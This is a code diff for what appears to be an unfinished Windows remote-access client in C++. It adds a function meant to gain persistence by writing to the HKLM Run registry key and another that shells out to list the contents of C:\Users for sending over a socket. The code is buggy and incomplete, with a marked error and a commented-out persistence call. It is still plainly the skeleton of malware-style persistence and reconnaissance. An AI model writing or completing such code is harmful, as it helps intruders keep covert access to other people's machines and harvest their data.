@@ -6,31 +6,86 @@
 #include <WS2tcpip.h>
 #include <string>
 #include <winapifamily.h>
+#include <stdlib.h>
+#include <stdio.h>
 
 //specify WinSock lib or else symbols will not match
 #pragma comment(lib,"ws2_32.lib") //WinSock lib
 
+/*
+ * This function will edit registries in order to 
+ * obtain persistence for the client and check to
+ * see if this has already been accomplished.
+ */
+int reg_maker() {
+	int result = 0; //holds the result of function
+	
+	//check if reg key exists
+	char* key = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
+	HKEY hkey;
+	if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, key, 0, KEY_READ, &hkey) == ERROR_SUCCESS) {
+		std::cout << "if one" << std::endl;
+		DWORD data = 0;
+		DWORD length = sizeof(data);
+		DWORD type = REG_DWORD;
+		char* value = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Persistence";
+
+		//Query Value to check if it has the location of the file in it
+		///////////////////////////////////////ERROR HERE//////////////////////////////////////////////
+		if (RegQueryValueExA(HKEY_LOCAL_MACHINE, value, 0, (LPDWORD)&type, (LPBYTE)&data, &length) != ERROR_SUCCESS)
+			std::cout << "Could not query reg key" << std::endl;
+		///////////////////////////////////////////////////////////////////////////////////////////////
+		else {
+			//data += "C:\\Users\\michael\\Documents\\Visual Studio 2015\\Projects\\try_3\\Debug\\try_3.exe";
+			//Add key inside try_3 using the RegSetValueExA function
+			if (RegSetValueExA(HKEY_LOCAL_MACHINE, value, NULL, REG_DWORD, (LPBYTE)&data, sizeof(DWORD)) != ERROR_SUCCESS)
+				std::cout << "Failed to set registry value" << std::endl;
+			std::cout << data << std::endl;
+		}
+	}
+	else
+		std::cout << "Could not open reg key" << std::endl;
+
+	
+	
+	//close registry editor
+	return 0;
+}
+
+
+/*
+ *This function prints the directories/files of the Users
+ *directory and sends them to the char buffer via the pipe
+ */
+int startup_finder() {
+	const char* cmd = "dir C:\\Users";
+	char buffer[128];
+	std::string result = "";
+	FILE* _pipe = _popen(cmd, "r");
+
+	if (!_pipe) {
+		std::cout << "ERROR" << std::endl;
+	}
+	
+	while (!feof(_pipe)) {
+		if (fgets(buffer, 128, _pipe) != NULL)
+			result += buffer;
+	}
+	_pclose(_pipe);
+
+	std::cout << result << std::endl;
+	//////////////NEED TO PARSE/////////////////
+
+	return 0;
+}
+
+/*
+ *
+ */
 int main()
 {
-	//check if reg key exists
-	char* key = "SOFTWARE\\try_3";
-	HKEY hkey;
-	if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, key, 0, KEY_READ, &hkey) != ERROR_SUCCESS)
-		std::cout << "Could not open reg key" << std::endl;
-	//locate HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services
-	//create registry
-	if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, key, 0L, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkey, NULL) != ERROR_SUCCESS)
-		std::cout << "Could not create reg key" << std::endl;
-	//Add key inside try_3 using the RegSetValueExA function
-
-	//set Parameters key
-	//add value
-	/*Value Name: Application
-	 *Data Type:  REG_SZ
-	 *String:     <path>\<application.ext>
-	 */
-	//close registry editor
-
+	//reg_maker();
+	startup_finder();
 
 	//Initialize Socket
 	WSAData version; //We need to check the version
